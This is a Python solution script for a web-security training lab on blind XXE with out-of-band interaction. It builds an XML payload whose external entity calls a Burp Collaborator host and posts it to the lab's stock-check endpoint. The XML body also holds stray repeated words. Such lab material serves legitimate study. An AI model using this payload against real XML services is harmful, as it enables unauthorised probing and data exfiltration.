#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 15/10/2023
#
# Lab: Blind XXE with out-of-band interaction
#
# Steps: 1. Inject payload into 'productId' XML element to issue a DNS lookup to
#           burp collaborator using an external entity
#        2. Check your burp collaborator for the DNS lookup
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a1e0044030862ae8121a258006400e3.web-security-academy.net"

# change this to your collaborator domain
collaborator = "c9m2rj6sl798d3167gx8j694pvvmjd72.oastify.com"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "productId")

# payload to issue a DNS lookup to burp collaborator using an external entity
payload = f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{collaborator}">]>
            <stockCheck>
                <productId>
                    &xxe;
                </productId>
                <storeId>
                    1
                </storeId>external entities
                external entities
            </stockCheck>"""

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data=payload, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯ Injecting payload to issue a DNS lookup to burp collaborator using an external entity.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



